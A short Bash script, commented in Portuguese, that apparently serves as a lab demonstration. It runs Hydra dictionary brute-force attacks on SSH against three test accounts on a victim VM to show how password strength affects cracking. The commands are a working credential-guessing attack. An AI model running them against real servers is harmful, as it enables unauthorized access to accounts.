#!/usr/bin/env bash
#
# Ataque de forca bruta (online) contra o servico SSH usando Hydra.
# Executado a partir da maquina ATACANTE (Kali Linux) contra a VM VITIMA.
#
# Demonstra a relacao entre complexidade da senha e eficacia do ataque:
#   - usuario "fraco"   : senha trivial          -> encontrada quase instantaneamente
#   - usuario "medio"   : senha intermediaria    -> encontrada apos varias tentativas
#   - usuario "dificil" : senha forte/aleatoria  -> NAO encontrada (resiste ao dicionario)
#
set -euo pipefail

TARGET="192.168.64.8"            # IP da VM vitima (Ubuntu Server) - ajuste se necessario
WORDLIST="./wordlists/demo.txt"  # lista de senhas controlada para a demonstracao

# Flags:
#   -I : ignora o restorefile de execucoes anteriores
#   -t 1 : 1 tarefa por vez (determinístico; evita que o SSH descarte conexoes)
#   -f : para assim que encontrar uma senha valida
#   -V : modo verboso (mostra cada tentativa)

echo "[*] Ataque ao usuario 'fraco' (senha trivial)"
hydra -I -t 1 -l fraco   -P "$WORDLIST" -f -V "ssh://$TARGET"

echo "[*] Ataque ao usuario 'medio' (senha intermediaria)"
hydra -I -t 1 -l medio   -P "$WORDLIST" -f -V "ssh://$TARGET"

echo "[*] Ataque ao usuario 'dificil' (senha forte) - esperado: 0 senhas encontradas"
hydra -I -t 1 -l dificil -P "$WORDLIST"    -V "ssh://$TARGET"
